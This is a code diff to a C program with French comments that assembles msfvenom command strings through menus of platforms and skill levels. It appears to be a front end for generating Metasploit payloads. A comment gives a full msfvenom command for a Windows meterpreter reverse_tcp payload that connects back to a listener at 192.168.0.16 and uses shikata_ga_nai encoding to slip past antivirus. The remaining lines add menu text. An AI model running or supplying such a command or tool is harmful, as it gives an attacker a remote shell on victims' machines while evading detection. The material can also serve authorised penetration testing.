@@ -1,6 +1,7 @@
 // payload string
 // msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.16 LPORT=55315 -a x86 --platform windows -e x86/shikata_ga_nai -i 4 -n 24 -K -f csharp -o /root/payload.cs
-char* platformSelected ;
+char*  Choice;
+char*  platformSelected ;
 char	*payloadBuild		="msfvenom -p ";
 char	*lhostBuild		=" LHOST=";
 char	lhost[25]		="192.168.0.1";
@@ -18,7 +19,6 @@ char	*filenameBuild		=" -o ";
 char	filename[250]		=""; 
 
 
-
 // les couleurs
 char 	cyan[]			="\033[0;36m";
 char 	Green[]			="\033[0;32m";
@@ -30,11 +30,16 @@ char 	yellow[]		="\033[1;33m";
 char 	BlueF[]			="\033[1;34m";
 char 	orange[]		="\033[38;5;166m";
 
+// tableau interchoices
+char	tbl_interchoices_0[]	= "[0] Exit\n";
+char	tbl_interchoices_1[]	= "[1] Creator step by step [Novice]\n";
+char	tbl_interchoices_2[]	= "[2] Quik creator.........[Experienced]\n";
+
+
 // tableau des plateformes
 char	tbl_plateform_0[] 	= "[0] Exit\n";
-char	tbl_plateform_1[] 	= "[1] android\n";
+char	tbl_plateform_1[] 	= "[ ] android \n";
 char	tbl_plateform_2[] 	= "[2] windows\n";
-char	tbl_plateform_3[] 	= "[3] quick creator\n";
 
 // tableau des familles de processeurs
 char	tbl_procfamily_0[] 	= "[0] Exit\n";
